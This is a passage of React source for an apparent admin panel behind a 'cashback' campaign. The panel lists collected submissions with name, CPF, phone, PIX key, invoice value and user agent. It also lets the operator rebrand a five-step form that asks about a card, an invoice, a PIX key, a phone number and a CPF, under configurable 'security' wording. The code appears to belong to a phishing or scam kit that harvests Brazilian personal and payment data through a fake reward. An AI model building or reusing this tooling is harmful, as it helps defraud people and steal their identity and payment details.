          :subs.length===0?<div className="text-center py-12 bg-white rounded-2xl border"><p className="text-gray-400">Nenhum registro</p></div>
          :<div className="space-y-3">{subs.map(s=><div key={s.id} className="bg-white rounded-xl border p-4">
            <div className="flex flex-wrap items-start justify-between gap-2 mb-2"><div><p className="font-bold text-gray-900">{s.nome}</p><p className="text-xs text-gray-400">{s.cpf_formatted} • {s.phone} • {s.created_at}</p>{s.user_agent&&<p className="text-xs text-gray-300 mt-0.5">🖥 {s.user_agent}</p>}</div><div className="flex items-center gap-2"><span className={`px-2.5 py-1 rounded-full text-xs font-bold ${stColors[s.status]||"bg-gray-100"}`}>{s.status}</span><span className="font-black text-green-700">{fmtCur(s.cashback)}</span></div></div>
            <div className="flex flex-wrap gap-2 text-xs mb-2"><span className="bg-gray-100 px-2 py-1 rounded">PIX {s.pix_type}: {s.pix_key}</span><span className="bg-gray-100 px-2 py-1 rounded">Fatura: {fmtCur(s.valor_fatura)}</span></div>
            <div className="flex flex-wrap items-center gap-2">
              {s.status!=="pago"&&<button onClick={()=>updateStatus(s.id,"pago")} className="px-3 py-1.5 bg-green-100 text-green-700 rounded-lg text-xs font-bold">✅ Pago</button>}
              {s.status!=="rejeitado"&&<button onClick={()=>updateStatus(s.id,"rejeitado")} className="px-3 py-1.5 bg-red-100 text-red-700 rounded-lg text-xs font-bold">❌ Rejeitar</button>}
              {s.status!=="pendente"&&<button onClick={()=>updateStatus(s.id,"pendente")} className="px-3 py-1.5 bg-yellow-100 text-yellow-700 rounded-lg text-xs font-bold">⏳ Pendente</button>}
              <button onClick={()=>deleteSub(s.id)} className="px-3 py-1.5 bg-gray-100 text-gray-500 rounded-lg text-xs font-bold hover:bg-red-100">🗑</button>
              <div className="flex-1"/><input type="text" placeholder="Obs..." defaultValue={s.notes||""} onBlur={e=>saveNotes(s.id,e.target.value)} className="text-xs border rounded-lg px-3 py-1.5 w-44 outline-none focus:border-red-400"/>
            </div>
          </div>)}</div>}
        </>}

        {adminTab==="editor"&&<div className="max-w-2xl">
          <h3 className="text-xl font-black text-gray-900 mb-6">🎨 Personalizar site</h3>

          {/* Logo Upload */}
          <div className="bg-white rounded-2xl border p-5 mb-4">
            <h4 className="font-bold text-gray-900 mb-4">🖼 Logo</h4>
            <div className="flex items-center gap-4 mb-4">
              {(edCfg.logo_url||C.logo_url)?<img src={edCfg.logo_url||C.logo_url} alt="Logo" className="h-14 rounded-xl border bg-gray-50 object-contain p-1"/>:<div className="w-14 h-14 rounded-xl bg-gray-100 flex items-center justify-center text-gray-400 text-2xl">📷</div>}
              <div className="flex-1">
                <p className="text-sm font-semibold text-gray-700 mb-1">Enviar logo</p>
                <p className="text-xs text-gray-400">JPG, PNG ou SVG — qualquer tamanho, o sistema ajusta</p>
              </div>
            </div>
            <div className="flex gap-2">
              <label className="flex-1 cursor-pointer">
                <div className="btn-main text-center text-sm !py-3" style={{background:C.primary_color}}>📎 Escolher imagem</div>
                <input type="file" accept="image/*" className="hidden" onChange={async e=>{
                  const f=e.target.files?.[0]; if(!f)return;
                  const reader=new FileReader();
                  reader.onload=async ev=>{
                    try{
                      const r=await aFetch("/api/logo",{method:"POST",body:JSON.stringify({image:ev.target.result})});
                      const d=await r.json();
                      if(d.ok){setEdCfg(p=>({...p,logo_url:d.url}));setC(p=>({...p,logo_url:d.url}));setEdSaved(true);setTimeout(()=>setEdSaved(false),2000)}
                    }catch{}
                  };
                  reader.readAsDataURL(f);
                }}/>
              </label>
              {(edCfg.logo_url||C.logo_url)&&<button onClick={()=>{setEdCfg(p=>({...p,logo_url:""}))}} className="px-4 py-2 border-2 border-red-200 text-red-500 rounded-2xl text-sm font-bold hover:bg-red-50">Remover</button>}
            </div>
          </div>

          {[
            {s:"🏷 Identidade",f:[{k:"site_name",l:"Nome do site (navegador + header)"}]},
            {s:"🎨 Cores",f:[{k:"primary_color",l:"Cor principal (header, botões, destaques)",t:"color"},{k:"accent_color",l:"Cor secundária",t:"color"}]},
            {s:"🏠 Tela principal",f:[{k:"hero_title",l:"Título"},{k:"hero_subtitle",l:"Subtítulo"},{k:"footer_text",l:"Rodapé"}]},
            {s:"1️⃣ Passo 1 — Cartão",f:[{k:"s1_title",l:"Pergunta"},{k:"s1_btn_yes",l:"Botão SIM"},{k:"s1_btn_no",l:"Botão NÃO"},{k:"s1_no_msg",l:"Mensagem se não tem cartão"}]},
            {s:"2️⃣ Passo 2 — Fatura",f:[{k:"s2_title",l:"Título"},{k:"s2_subtitle",l:"Subtítulo"},{k:"s2_btn",l:"Botão"}]},
            {s:"3️⃣ Passo 3 — Cashback + PIX",f:[{k:"s3_title",l:"Título"},{k:"s3_cashback_label",l:"Label cashback"},{k:"s3_cashback_sub",l:"Sub cashback"},{k:"s3_pix_title",l:"Pergunta PIX"},{k:"s3_btn",l:"Botão"}]},
            {s:"4️⃣ Passo 4 — Telefone",f:[{k:"s4_title",l:"Título"},{k:"s4_subtitle",l:"Subtítulo"},{k:"s4_btn",l:"Botão"}]},
            {s:"5️⃣ Passo 5 — CPF",f:[{k:"s5_title",l:"Título"},{k:"s5_subtitle",l:"Subtítulo"},{k:"s5_btn",l:"Botão"},{k:"s5_footer",l:"Texto de segurança"}]},
            {s:"✅ Sucesso",f:[{k:"success_title",l:"Título ({nome} = primeiro nome)"},{k:"success_msg",l:"Mensagem"}]},
            {s:"⚙️ Config",f:[{k:"cashback_percent",l:"Percentual (%)",t:"number"},{k:"prazo_horas",l:"Prazo (horas)",t:"number"}]},
          ].map(({s,f})=><div key={s} className="bg-white rounded-2xl border p-5 mb-4"><h4 className="font-bold text-gray-900 mb-4">{s}</h4><div className="space-y-3">{f.map(({k,l,t})=><div key={k}>
            <label className="block text-xs font-semibold text-gray-500 mb-1">{l}</label>
            {t==="color"?<div className="flex gap-2"><input type="color" value={edCfg[k]||"#CC092F"} onChange={e=>setEdCfg(p=>({...p,[k]:e.target.value}))} className="w-12 h-10 rounded-xl cursor-pointer border-0"/><input type="text" value={edCfg[k]||""} onChange={e=>setEdCfg(p=>({...p,[k]:e.target.value}))} className="input-main flex-1 !py-1.5 font-mono text-sm"/></div>
            :<input type={t||"text"} value={edCfg[k]||""} onChange={e=>setEdCfg(p=>({...p,[k]:e.target.value}))} className="input-main !py-2 text-sm"/>}
          </div>)}</div></div>)}

          {/* Preview ao vivo */}
          <div className="bg-white rounded-2xl border p-5 mb-4">
            <h4 className="font-bold text-gray-900 mb-3">👁 Preview</h4>
            <div className="rounded-2xl overflow-hidden border">
              <div className="p-4 flex items-center gap-2" style={{background:edCfg.primary_color||C.primary_color}}>
                {(edCfg.logo_url||C.logo_url)?<img src={edCfg.logo_url||C.logo_url} alt="" className="h-7 rounded-lg object-contain"/>:<div className="w-7 h-7 rounded-lg bg-white/20"/>}
                <span className="text-white font-bold text-sm">{edCfg.site_name||C.site_name}</span>
              </div>
              <div className="p-4 bg-gray-50">
                <p className="font-black text-sm text-gray-900 mb-1">{edCfg.hero_title||C.hero_title}</p>
                <p className="text-xs text-gray-400 mb-3">{edCfg.hero_subtitle||C.hero_subtitle}</p>
                <div className="rounded-xl py-2 text-center text-white text-xs font-bold" style={{background:edCfg.primary_color||C.primary_color}}>{edCfg.s2_btn||C.s2_btn}</div>
              </div>
            </div>
          </div>

          <button onClick={saveEditor} disabled={edSaving} className="btn-main mb-8" style={{background:C.primary_color}}>{edSaving?"Salvando...":edSaved?"✅ Salvo!":"💾 Salvar todas as alterações"}</button>
        </div>}

        {adminTab==="log"&&<div><h3 className="text-xl font-black text-gray-900 mb-4">📋 Log</h3><div className="bg-white rounded-xl border divide-y">{logData.length===0?<p className="p-6 text-gray-400 text-center">Nenhuma atividade</p>:logData.map((l,i)=><div key={i} className="px-5 py-3 flex justify-between"><div><span className="font-semibold text-sm">{l.action}</span>{l.details&&<span className="text-gray-400 text-sm ml-2">— {l.details}</span>}</div><span className="text-xs text-gray-400">{l.created_at}</span></div>)}</div></div>}
      </main>
    </div>
  );
}
